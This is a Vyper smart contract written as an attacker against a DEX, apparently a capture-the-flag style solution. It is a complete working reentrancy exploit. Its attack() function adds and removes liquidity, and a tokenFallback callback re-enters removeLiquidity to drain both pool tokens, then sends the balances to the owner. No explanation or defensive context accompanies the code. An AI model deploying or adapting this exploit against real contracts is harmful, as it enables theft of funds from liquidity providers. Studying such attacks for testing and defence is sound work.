# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IDEX:
    def token0() -> address: view
    def token1() -> address: view
    def addLiquidity(x: uint256, y: uint256): nonpayable
    def removeLiquidity(x: uint256): nonpayable

owner: immutable(address)

TOKEN_BALANCE: constant(uint256) = as_wei_value(1, "ether")

dex: IDEX
token0: address
token1: address
reenter: bool

@external
@payable
def __init__(_dex: IDEX):
    owner = msg.sender
    self.dex = _dex
    self.token0 = self.dex.token0()
    self.token1 = self.dex.token1()

@external
def attack():
    assert msg.sender == owner, "!owner"
    IERC20(self.token0).transferFrom(msg.sender, self, TOKEN_BALANCE)
    IERC20(self.token1).transferFrom(msg.sender, self, TOKEN_BALANCE)
    IERC20(self.token0).approve(self.dex.address, max_value(uint256))
    IERC20(self.token1).approve(self.dex.address, max_value(uint256))
    self.dex.addLiquidity(TOKEN_BALANCE, TOKEN_BALANCE)
    self.dex.removeLiquidity(TOKEN_BALANCE)

@external
def tokenFallback(sender: address, amount: uint256, data: Bytes[max_value(uint8)]):
    if not self.reenter:
        self.reenter = True
    else:
        if IERC20(self.token1).balanceOf(sender) > 0:
            self.dex.removeLiquidity(amount)
        else:
            IERC20(self.token0).transfer(
                owner,
                IERC20(self.token0).balanceOf(self),
            )
            IERC20(self.token1).transfer(
                owner,
                IERC20(self.token1).balanceOf(self),
            )
